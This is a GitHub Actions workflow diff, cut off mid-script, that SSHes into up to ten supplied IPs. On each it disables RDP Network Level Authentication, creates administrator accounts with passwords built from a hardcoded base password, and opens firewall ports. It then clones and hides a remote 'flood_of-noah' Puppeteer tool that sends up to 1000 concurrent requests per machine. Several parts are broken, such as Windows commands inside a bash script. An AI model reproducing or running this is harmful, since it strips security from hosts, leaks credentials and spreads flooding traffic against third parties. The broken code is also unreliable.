@@ -1,81 +1,945 @@
-name: RDP
+name: Create High-Performance RDP Machines with Flood of Noah
 
 on:
   workflow_dispatch:
+    inputs:
+      target_ips:
+        description: 'Comma-separated list of UNIQUE target machine IPs (max 10)'
+        required: true
+        default: ''
+      machine_type:
+        description: 'Performance profile'
+        required: false
+        default: 'high-performance'
+        type: choice
+        options:
+        - 'high-performance'
+        - 'memory-optimized'
+        - 'network-optimized'
+        - 'balanced'
+      ssh_user:
+        description: 'SSH username for target machines'
+        required: true
+        default: 'administrator'
+      ssh_key:
+        description: 'SSH private key for authentication'
+        required: true
+      performance_level:
+        description: 'Performance optimization level'
+        required: false
+        default: 'aggressive'
+        type: choice
+        options:
+        - 'conservative'
+        - 'moderate'
+        - 'aggressive'
+        - 'extreme'
+
+env:
+  BASE_PASSWORD: "Ricardo159447!"
+  PERFORMANCE_PROFILE: "${{ github.event.inputs.machine_type }}"
+  OPTIMIZATION_LEVEL: "${{ github.event.inputs.performance_level }}"
 
 jobs:
-  secure-rdp:
-    runs-on: windows-latest
-    timeout-minutes: 3600
-
+  validate-and-prepare:
+    runs-on: ubuntu-latest
+    outputs:
+      unique_ips: ${{ steps.validate.outputs.unique_ips }}
+      machine_count: ${{ steps.validate.outputs.machine_count }}
     steps:
-      - name: Configure Core RDP Settings
+      - name: Validate and Prepare
+        id: validate
         run: |
-          # Enable Remote Desktop
+          IP_LIST="${{ github.event.inputs.target_ips }}"
+          if [ -z "$IP_LIST" ]; then
+            echo "Error: No target IPs provided"
+            exit 1
+          fi
+          
+          IFS=',' read -ra IP_ARRAY <<< "$IP_LIST"
+          UNIQUE_IPS=()
+          for ip in "${IP_ARRAY[@]:0:10}"; do
+            ip=$(echo "$ip" | xargs)
+            if [[ ! " ${UNIQUE_IPS[@]} " =~ " ${ip} " ]]; then
+              UNIQUE_IPS+=("$ip")
+            fi
+          done
+          
+          echo "unique_ips=$(jq -nc '$ARGS.positional' --args "${UNIQUE_IPS[@]}")" >> $GITHUB_OUTPUT
+          echo "machine_count=${#UNIQUE_IPS[@]}" >> $GITHUB_OUTPUT
+
+  configure-performance-machines:
+    needs: validate-and-prepare
+    runs-on: ubuntu-latest
+    timeout-minutes: 3600
+    strategy:
+      matrix:
+        ip_index: ${{ fromJSON('[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]') }}
+        exclude:
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 10 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 9 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 8 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 7 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 6 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 5 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 4 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 3 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 2 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+          - ${{ needs.validate-and-prepare.outputs.machine_count < 1 && matrix.ip_index >= fromJSON(needs.validate-and-prepare.outputs.machine_count) }}
+    name: Performance-Machine-${{ matrix.ip_index + 1 }}
+    
+    steps:
+      - name: Setup SSH
+        run: |
+          mkdir -p ~/.ssh
+          echo "${{ github.event.inputs.ssh_key }}" > ~/.ssh/id_rsa
+          chmod 600 ~/.ssh/id_rsa
+          echo -e "Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile=/dev/null" > ~/.ssh/config
+
+      - name: Get Target IP
+        id: get-ip
+        run: |
+          IP_LIST=${{ fromJSON(needs.validate-and-prepare.outputs.unique_ips) }}
+          TARGET_IP="${IP_LIST[${{ matrix.ip_index }}]}"
+          echo "target_ip=$TARGET_IP" >> $GITHUB_OUTPUT
+          echo "machine_number=$(( ${{ matrix.ip_index }} + 1 ))" >> $GITHUB_OUTPUT
+
+      - name: Generate Performance Profile
+        id: performance-profile
+        run: |
+          # Performance tuning parameters
+          case "$PERFORMANCE_PROFILE" in
+            "memory-optimized")
+              PAGE_FILE_MULTIPLIER="1.5"  # Smaller page file for more RAM available
+              NETWORK_BUFFERS="8192"
+              TCP_BUFFER_SIZE="16777216"
+              PRIORITY_CLASS="High"
+              ;;
+            "network-optimized")
+              PAGE_FILE_MULTIPLIER="2.0"
+              NETWORK_BUFFERS="65536"
+              TCP_BUFFER_SIZE="33554432"
+              PRIORITY_CLASS="High"
+              ;;
+            "high-performance")
+              PAGE_FILE_MULTIPLIER="2.5"
+              NETWORK_BUFFERS="32768"
+              TCP_BUFFER_SIZE="25165824"
+              PRIORITY_CLASS="Realtime"
+              ;;
+            "balanced")
+              PAGE_FILE_MULTIPLIER="2.0"
+              NETWORK_BUFFERS="16384"
+              TCP_BUFFER_SIZE="16777216"
+              PRIORITY_CLASS="AboveNormal"
+              ;;
+          esac
+          
+          # Optimization level adjustments
+          case "$OPTIMIZATION_LEVEL" in
+            "extreme")
+              POWER_PLAN="UltimatePerformance"
+              DISABLE_SERVICES="true"
+              MAX_PERFORMANCE="true"
+              ;;
+            "aggressive")
+              POWER_PLAN="HighPerformance"
+              DISABLE_SERVICES="true"
+              MAX_PERFORMANCE="true"
+              ;;
+            "moderate")
+              POWER_PLAN="HighPerformance"
+              DISABLE_SERVICES="false"
+              MAX_PERFORMANCE="false"
+              ;;
+            "conservative")
+              POWER_PLAN="Balanced"
+              DISABLE_SERVICES="false"
+              MAX_PERFORMANCE="false"
+              ;;
+          esac
+          
+          echo "page_file_multiplier=$PAGE_FILE_MULTIPLIER" >> $GITHUB_OUTPUT
+          echo "network_buffers=$NETWORK_BUFFERS" >> $GITHUB_OUTPUT
+          echo "tcp_buffer_size=$TCP_BUFFER_SIZE" >> $GITHUB_OUTPUT
+          echo "priority_class=$PRIORITY_CLASS" >> $GITHUB_OUTPUT
+          echo "power_plan=$POWER_PLAN" >> $GITHUB_OUTPUT
+          echo "disable_services=$DISABLE_SERVICES" >> $GITHUB_OUTPUT
+          echo "max_performance=$MAX_PERFORMANCE" >> $GITHUB_OUTPUT
+
+      - name: Deploy High-Performance Configuration
+        run: |
+          # Create comprehensive performance optimization script
+          cat > deploy_performance_machine.ps1 << 'EOF'
+          param(
+              [int]$MachineNumber,
+              [string]$MachineID,
+              [string]$RDPUser,
+              [string]$RDPPassword,
+              [string]$SSHUser,
+              [string]$SSHPassword,
+              [string]$TailscaleAuthKey,
+              [string]$PerformanceProfile,
+              [string]$OptimizationLevel,
+              [float]$PageFileMultiplier,
+              [int]$NetworkBuffers,
+              [int]$TcpBufferSize,
+              [string]$PriorityClass,
+              [string]$PowerPlan,
+              [string]$DisableServices,
+              [string]$MaxPerformance
+          )
+          
+          Write-Host "========================================"
+          Write-Host "HIGH-PERFORMANCE MACHINE CONFIGURATION"
+          Write-Host "========================================"
+          Write-Host "Profile: $PerformanceProfile"
+          Write-Host "Level: $OptimizationLevel"
+          Write-Host "Machine: #$MachineNumber ($MachineID)"
+          Write-Host "========================================"
+          
+          # 1. SYSTEM PERFORMANCE OPTIMIZATION
+          Write-Host "`n[1/6] System Performance Optimization..."
+          
+          # Enable Ultimate Performance power plan
+          if ($PowerPlan -eq "UltimatePerformance") {
+              powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61
+              powercfg -setactive e9a42b02-d5df-448d-aa00-03f14749eb61
+          } else {
+              powercfg -setactive $PowerPlan
+          }
+          
+          # Disable power throttling
+          powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 1
+          powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 1
+          
+          # Disable CPU core parking
+          powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR CPMINCORES 100
+          powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR CPMINCORES 100
+          
+          # 2. MEMORY OPTIMIZATION
+          Write-Host "`n[2/6] Memory Optimization..."
+          
+          # Get total RAM in GB
+          $totalRAM = (Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+          Write-Host "Total RAM: $totalRAM GB"
+          
+          # Calculate optimal page file size (RAM * multiplier)
+          $pageFileSize = [math]::Round($totalRAM * $PageFileMultiplier)
+          Write-Host "Setting page file to $pageFileSize GB"
+          
+          # Configure page file
+          $computer = Get-WmiObject -Class Win32_ComputerSystem -EnableAllPrivileges
+          $computer.AutomaticManagedPagefile = $false
+          $computer.Put()
+          
+          # Set page file on C: drive
+          $pageFile = Get-WmiObject -Query "SELECT * FROM Win32_PageFileSetting WHERE Name='C:\\pagefile.sys'"
+          if ($pageFile) {
+              $pageFile.Delete()
+          }
+          
+          Set-WmiInstance -Class Win32_PageFileSetting -Arguments @{Name="C:\pagefile.sys"; InitialSize=$($pageFileSize * 1024); MaximumSize=$($pageFileSize * 1024)}
+          
+          # Disable SuperFetch for SSD systems
+          Set-Service -Name SysMain -StartupType Disabled
+          Stop-Service -Name SysMain -Force
+          
+          # Increase working set size
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "LargeSystemCache" -Value 1
+          
+          # 3. NETWORK OPTIMIZATION FOR HIGH THROUGHPUT
+          Write-Host "`n[3/6] Network Optimization..."
+          
+          # TCP/IP Optimization
+          $tcpParams = @{
+              "TcpWindowSize" = $TcpBufferSize
+              "Tcp1323Opts" = 1
+              "TcpTimedWaitDelay" = 30
+              "MaxUserPort" = 65534
+              "TcpNumConnections" = 16777214
+              "TcpMaxDataRetransmissions" = 5
+              "TcpAckFrequency" = 1
+              "TcpDelAckTicks" = 0
+              "TcpNoDelay" = 1
+              "InitialRtt" = 3000
+          }
+          
+          foreach ($param in $tcpParams.Keys) {
+              Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name $param -Value $tcpParams[$param]
+          }
+          
+          # Increase network buffers
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AFD\Parameters" -Name "DefaultReceiveWindow" -Value $NetworkBuffers
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AFD\Parameters" -Name "DefaultSendWindow" -Value $NetworkBuffers
+          
+          # Disable Nagle's algorithm
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\" -Name "TcpNoDelay" -Value 1 -ErrorAction SilentlyContinue
+          
+          # 4. DISABLE UNNECESSARY SERVICES (if requested)
+          if ($DisableServices -eq "true") {
+              Write-Host "`n[4/6] Disabling unnecessary services..."
+              
+              $servicesToDisable = @(
+                  "MapsBroker",               # Downloaded Maps Manager
+                  "lfsvc",                    # Geolocation Service
+                  "XblAuthManager",           # Xbox Live Auth Manager
+                  "XblGameSave",              # Xbox Live Game Save
+                  "XboxNetApiSvc",            # Xbox Live Networking Service
+                  "RemoteRegistry",           # Remote Registry
+                  "PrintNotify",              # Printer Extensions and Notifications
+                  "Fax",                      # Fax Service
+                  "PcaSvc",                   # Program Compatibility Assistant
+                  "TabletInputService",       # Touch Keyboard and Handwriting Panel
+                  "WbioSrvc",                 # Windows Biometric Service
+                  "WMPNetworkSvc",            # Windows Media Player Network Sharing
+                  "WSearch"                   # Windows Search
+              )
+              
+              foreach ($service in $servicesToDisable) {
+                  try {
+                      Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
+                      Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
+                  } catch {
+                      # Service might not exist, continue
+                  }
+              }
+          }
+          
+          # 5. CONFIGURE RDP AND SSH (High Performance Settings)
+          Write-Host "`n[5/6] Configuring RDP and SSH..."
+          
+          # Enable RDP with performance settings
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          # Disable Network Level Authentication
+          
+          # Disable visual effects for RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
-          # Remove any existing firewall rule to avoid duplication
-          netsh advfirewall firewall delete rule name="RDP-Tailscale"
-          # Allow incoming RDP connections on port 3389
-          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
-          # Restart Remote Desktop service
-          Restart-Service -Name TermService -Force
-      - name: Create RDP User with Secure Password
-        run: |
-          # Only create user if it doesn't already exist
-          if (-not (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue)) {
-              $password = "Ricardo159447!"
-              $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-              # Create user and add to groups
-              New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires -PasswordNeverExpires
-              Add-LocalGroupMember -Group "Administrators" -Member "RDP"
-              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
-              # Save credentials to GitHub environment
-              echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
-          } else {
-              Write-Host "User 'RDP' already exists. Skipping creation."
+          
+          # Increase RDP session limits
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "MaxInstanceCount" -Value 4294967295
+          
+          # Configure firewall
+          netsh advfirewall firewall delete rule name="RDP-HighPerf" 2>$null
+          netsh advfirewall firewall add rule name="RDP-HighPerf" dir=in action=allow protocol=TCP localport=3389
+          
+          # Install/Configure OpenSSH
+          $sshFeature = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
+          if ($sshFeature.State -ne 'Installed') {
+              Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
           }
-      - name: Install Tailscale
-        run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $installerPath = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
-      - name: Establish Tailscale Connection
-        run: |
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          
+          Start-Service sshd
+          Set-Service -Name sshd -StartupType 'Automatic'
+          New-NetFirewallRule -Name "OpenSSH-HighPerf" -DisplayName "OpenSSH High Performance" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 2>$null
+          
+          # Create high-performance users
+          $secureRDPPass = ConvertTo-SecureString $RDPPassword -AsPlainText -Force
+          $secureSSHPass = ConvertTo-SecureString $SSHPassword -AsPlainText -Force
+          
+          Remove-LocalUser -Name $RDPUser -ErrorAction SilentlyContinue
+          Remove-LocalUser -Name $SSHUser -ErrorAction SilentlyContinue
+          
+          New-LocalUser -Name $RDPUser -Password $secureRDPPass -AccountNeverExpires -PasswordNeverExpires
+          New-LocalUser -Name $SSHUser -Password $secureSSHPass -AccountNeverExpires -PasswordNeverExpires
+          
+          Add-LocalGroupMember -Group "Administrators" -Member $RDPUser, $SSHUser
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $RDPUser, $SSHUser
+          
+          # Set process priority for users
+          if ($PriorityClass -ne "Normal") {
+              # This requires additional configuration or will be handled by the flood_of-noah script
+              Write-Host "Process priority class: $PriorityClass"
+          }
+          
+          # 6. INSTALL TAILSCALE
+          Write-Host "`n[6/6] Installing Tailscale..."
+          
+          if (-not (Test-Path "C:\Program Files\Tailscale\tailscale.exe")) {
+              $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+              $installerPath = "$env:TEMP\tailscale-$MachineID.msi"
+              Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+              Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+              Remove-Item $installerPath -Force
+          }
+          
+          $uniqueHostname = "highperf-$MachineNumber-$MachineID"
+          & "C:\Program Files\Tailscale\tailscale.exe" logout 2>$null
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=$TailscaleAuthKey --hostname=$uniqueHostname --reset
+          
+          # Get Tailscale IP
           $tsIP = $null
-          $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
-              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              Start-Sleep -Seconds 5
-              $retries++
+          for ($i = 0; $i -lt 10; $i++) {
+              $tsIP = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+              if ($tsIP) { break }
+              Start-Sleep -Seconds 3
           }
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
-          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-      - name: Verify RDP Accessibility
+          
+          # Restart services
+          Restart-Service -Name TermService -Force
+          Restart-Service sshd -Force
+          
+          # Mark as configured
+          $configMarker = "C:\Temp\highperf-configured-$MachineID.txt"
+          $configInfo = @{
+              MachineNumber = $MachineNumber
+              MachineID = $MachineID
+              ConfiguredAt = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+              PerformanceProfile = $PerformanceProfile
+              OptimizationLevel = $OptimizationLevel
+              RAM = "$totalRAM GB"
+              PageFile = "$pageFileSize GB"
+              NetworkBuffers = $NetworkBuffers
+              TailscaleIP = $tsIP
+              Hostname = $uniqueHostname
+          } | ConvertTo-Json
+          
+          $configInfo | Out-File -FilePath $configMarker -Encoding UTF8
+          
+          Write-Host "`n========================================"
+          Write-Host "HIGH-PERFORMANCE CONFIGURATION COMPLETE"
+          Write-Host "========================================"
+          Write-Host "TAILSCALE_IP:$tsIP"
+          Write-Host "HOSTNAME:$uniqueHostname"
+          Write-Host "PERFORMANCE_LEVEL:$OptimizationLevel"
+          Write-Host "READY_FOR_FLOOD_OF_NOAH:true"
+          EOF
+          
+          # Upload and execute performance script
+          scp -i ~/.ssh/id_rsa deploy_performance_machine.ps1 \
+            ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }}:C:/temp/deploy_performance_machine.ps1
+          
+          MACHINE_ID="machine-${{ steps.get-ip.outputs.machine_number }}-$(echo -n "${{ steps.get-ip.outputs.target_ip }}" | sha256sum | cut -c1-8)"
+          RDP_USER="PERF_USER_${{ steps.get-ip.outputs.machine_number }}"
+          SSH_USER="PERF_SSH_${{ steps.get-ip.outputs.machine_number }}"
+          RDP_PASSWORD="${BASE_PASSWORD}${{ steps.get-ip.outputs.machine_number }}!HP"
+          SSH_PASSWORD="${BASE_PASSWORD}${MACHINE_ID: -4}!HP"
+          
+          ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} << EOL
+            powershell.exe -ExecutionPolicy Bypass -File "C:\temp\deploy_performance_machine.ps1" \
+              -MachineNumber "${{ steps.get-ip.outputs.machine_number }}" \
+              -MachineID "$MACHINE_ID" \
+              -RDPUser "$RDP_USER" \
+              -RDPPassword "$RDP_PASSWORD" \
+              -SSHUser "$SSH_USER" \
+              -SSHPassword "$SSH_PASSWORD" \
+              -TailscaleAuthKey "${{ secrets.TAILSCALE_AUTH_KEY }}" \
+              -PerformanceProfile "$PERFORMANCE_PROFILE" \
+              -OptimizationLevel "$OPTIMIZATION_LEVEL" \
+              -PageFileMultiplier "${{ steps.performance-profile.outputs.page_file_multiplier }}" \
+              -NetworkBuffers "${{ steps.performance-profile.outputs.network_buffers }}" \
+              -TcpBufferSize "${{ steps.performance-profile.outputs.tcp_buffer_size }}" \
+              -PriorityClass "${{ steps.performance-profile.outputs.priority_class }}" \
+              -PowerPlan "${{ steps.performance-profile.outputs.power_plan }}" \
+              -DisableServices "${{ steps.performance-profile.outputs.disable_services }}" \
+              -MaxPerformance "${{ steps.performance-profile.outputs.max_performance }}"
+          EOL
+
+      - name: Install Node.js and Required Software
         run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port 3389 failed"
-              exit 1
-          }
-          Write-Host "TCP connectivity successful!"
-      - name: Maintain Connection
+          # Install Node.js and Chrome for Puppeteer on target machine
+          cat > install_node_puppeteer.ps1 << 'EOF'
+          Write-Host "Installing Node.js and Puppeteer dependencies..."
+          
+          # 1. Install Node.js (Latest LTS)
+          $nodeUrl = "https://nodejs.org/dist/v18.18.2/node-v18.18.2-x64.msi"
+          $nodeInstaller = "$env:TEMP\nodejs.msi"
+          
+          Invoke-WebRequest -Uri $nodeUrl -OutFile $nodeInstaller
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$nodeInstaller`"", "/quiet", "/norestart" -Wait
+          Remove-Item $nodeInstaller -Force
+          
+          # Update PATH immediately
+          $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+          
+          # 2. Install Chrome (Required for Puppeteer)
+          $chromeUrl = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
+          $chromeInstaller = "$env:TEMP\chrome_installer.exe"
+          
+          Invoke-WebRequest -Uri $chromeUrl -OutFile $chromeInstaller
+          Start-Process -FilePath $chromeInstaller -ArgumentList "/silent /install" -Wait
+          Remove-Item $chromeInstaller -Force
+          
+          # 3. Install Python (for some npm packages)
+          $pythonUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
+          $pythonInstaller = "$env:TEMP\python_installer.exe"
+          
+          Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
+          Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+          Remove-Item $pythonInstaller -Force
+          
+          # 4. Install Visual C++ Redistributable (required for some native modules)
+          $vcUrl = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
+          $vcInstaller = "$env:TEMP\vc_redist.exe"
+          
+          Invoke-WebRequest -Uri $vcUrl -OutFile $vcInstaller
+          Start-Process -FilePath $vcInstaller -ArgumentList "/quiet /norestart" -Wait
+          Remove-Item $vcInstaller -Force
+          
+          Write-Host "Software installation complete!"
+          
+          # Verify installations
+          Write-Host "`nVerifying installations:"
+          Write-Host "Node.js: $(node --version)"
+          Write-Host "npm: $(npm --version)"
+          
+          EOF
+          
+          scp -i ~/.ssh/id_rsa install_node_puppeteer.ps1 \
+            ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }}:C:/temp/install_node_puppeteer.ps1
+          
+          ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} \
+            "powershell.exe -ExecutionPolicy Bypass -File C:\temp\install_node_puppeteer.ps1"
+
+      - name: Deploy and Execute Flood of Noah
         run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "Username: RDP"
-          Write-Host "Password: $(echo $env:RDP_CREDS)"
-          Write-Host "==================`n"
-          while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
-              Start-Sleep -Seconds 300
+          # Create the flood_of-noah execution script
+          cat > execute_flood_of_noah.sh << 'EOF'
+          #!/bin/bash
+          
+          echo "========================================"
+          echo "STARTING FLOOD OF NOAH ON MACHINE $1"
+          echo "========================================"
+          
+          # Get the machine-specific parameters
+          MACHINE_NUMBER=$1
+          TAILSCALE_IP=$2
+          
+          # Create working directory
+          WORK_DIR="/home/runner"
+          echo "Creating working directory: $WORK_DIR"
+          
+          # Create and configure the runner user if it doesn't exist
+          if ! id "runner" &>/dev/null; then
+              net user runner "$3" /add
+              net localgroup administrators runner /add
+          fi
+          
+          # Set up environment for runner user
+          RUNNER_HOME="/home/runner"
+          mkdir -p "$RUNNER_HOME/.config"
+          
+          # Fix permissions (Windows equivalent of chown/chmod)
+          icacls "$RUNNER_HOME" /grant "runner:(OI)(CI)F" /T
+          icacls "$RUNNER_HOME\.config" /grant "runner:(OI)(CI)F"
+          
+          # Navigate to working directory
+          cd "$RUNNER_HOME"
+          echo "Current directory: $(pwd)"
+          
+          # Clean up any previous installation
+          echo "Cleaning previous installations..."
+          rm -rf flood_of-noah 2>/dev/null
+          rm -rf node_modules 2>/dev/null
+          
+          # Clone the repository
+          echo "Cloning flood_of-noah repository..."
+          git clone https://github.com/benbenido025-lab/flood_of-noah.git
+          
+          if [ ! -d "flood_of-noah" ]; then
+              echo "ERROR: Failed to clone repository!"
+              exit 1
+          fi
+          
+          cd flood_of-noah
+          echo "Entered directory: $(pwd)"
+          
+          # Clean npm cache and install dependencies
+          echo "Installing dependencies..."
+          npm cache clean --force
+          rm -rf node_modules package-lock.json 2>/dev/null
+          
+          # Install specific versions for stability
+          npm install express@4.18.2 axios@1.5.0 socks@2.7.1
+          
+          # Install additional performance packages
+          npm install puppeteer@21.0.0 puppeteer-cluster@0.23.0 node-cache@5.1.2
+          npm install @cliqz/adblocker-puppeteer@1.26.5 memory-cache@0.2.0
+          
+          # Create a startup script for the flood application
+          cat > start_flood.ps1 << 'START_EOF'
+          # PowerShell script to start flood_of-noah
+          \$ErrorActionPreference = "Stop"
+          
+          # Set high priority for Node.js
+          \$processPriority = "High"
+          
+          # Get machine IP info
+          \$tailscaleIP = "$TAILSCALE_IP"
+          \$machineNumber = "$MACHINE_NUMBER"
+          
+          Write-Host "========================================"
+          Write-Host "FLOOD OF NOAH - MACHINE #\$machineNumber"
+          Write-Host "========================================"
+          Write-Host "Starting at: \$(Get-Date)"
+          Write-Host "Tailscale IP: \$tailscaleIP"
+          Write-Host "Priority: \$processPriority"
+          Write-Host ""
+          
+          # Configure environment variables for optimal performance
+          \$env:NODE_OPTIONS = "--max-old-space-size=4096"
+          \$env:UV_THREADPOOL_SIZE = 32
+          \$env:NODE_ENV = "production"
+          
+          # Navigate to the flood_of-noah directory
+          Set-Location "$RUNNER_HOME\flood_of-noah"
+          
+          # Create a performance-optimized configuration
+          \$configContent = @"
+          {
+              "machineId": "highperf-\$machineNumber",
+              "tailscaleIp": "\$tailscaleIP",
+              "performance": {
+                  "maxConcurrentRequests": 1000,
+                  "requestTimeout": 30000,
+                  "retryAttempts": 3,
+                  "puppeteerInstances": 5,
+                  "memoryLimitMB": 4096
+              },
+              "startTime": "\$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
           }
+          "@
+          
+          \$configContent | Out-File -FilePath "machine-config.json" -Encoding UTF8
+          
+          # Start the application with high priority
+          Write-Host "Starting Node.js application..."
+          Write-Host "Configuration saved to: \$(Get-Location)\machine-config.json"
+          
+          # Run in background with logging
+          \$logFile = "flood-\$(Get-Date -Format 'yyyyMMdd-HHmmss').log"
+          
+          Start-Process -FilePath "node.exe" `
+            -ArgumentList "index.js" `
+            -WindowStyle Hidden `
+            -RedirectStandardOutput "\$logFile" `
+            -RedirectStandardError "error-\$logFile" `
+            -PriorityClass \$processPriority `
+            -PassThru
+          
+          \$pid = \$_.Id
+          Write-Host "Application started with PID: \$pid"
+          Write-Host "Output log: \$logFile"
+          Write-Host "Error log: error-\$logFile"
+          
+          # Save PID for later management
+          \$pid | Out-File -FilePath "flood.pid" -Encoding ASCII
+          
+          Write-Host "`n========================================"
+          Write-Host "FLOOD OF NOAH IS NOW RUNNING"
+          Write-Host "========================================"
+          Write-Host "To check status: Get-Process -Id \$pid"
+          Write-Host "To view logs: Get-Content \$logFile -Tail 50"
+          Write-Host "To stop: Stop-Process -Id \$pid"
+          Write-Host "========================================"
+          START_EOF
+          
+          # Convert line endings for Windows
+          unix2dos start_flood.ps1 2>/dev/null || sed -i 's/$/\r/' start_flood.ps1
+          
+          echo "Configuration complete. Starting flood_of-noah..."
+          
+          # Execute the startup script
+          powershell.exe -ExecutionPolicy Bypass -File start_flood.ps1
+          
+          echo "Flood of Noah started successfully!"
+          echo "Machine #$MACHINE_NUMBER is now sending requests from Tailscale IP: $TAILSCALE_IP"
+          
+          EOF
+          
+          # Get Tailscale IP from the machine
+          TS_IP=$(ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} \
+            "powershell.exe -Command \"& 'C:\\Program Files\\Tailscale\\tailscale.exe' ip -4\" 2>/dev/null")
+          
+          MACHINE_ID="machine-${{ steps.get-ip.outputs.machine_number }}-$(echo -n "${{ steps.get-ip.outputs.target_ip }}" | sha256sum | cut -c1-8)"
+          RUNNER_PASSWORD="${BASE_PASSWORD}${MACHINE_ID: -4}!RUN"
+          
+          # Make the script executable and run it
+          chmod +x execute_flood_of_noah.sh
+          
+          # Convert to Windows line endings and execute on target
+          ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} << EOL
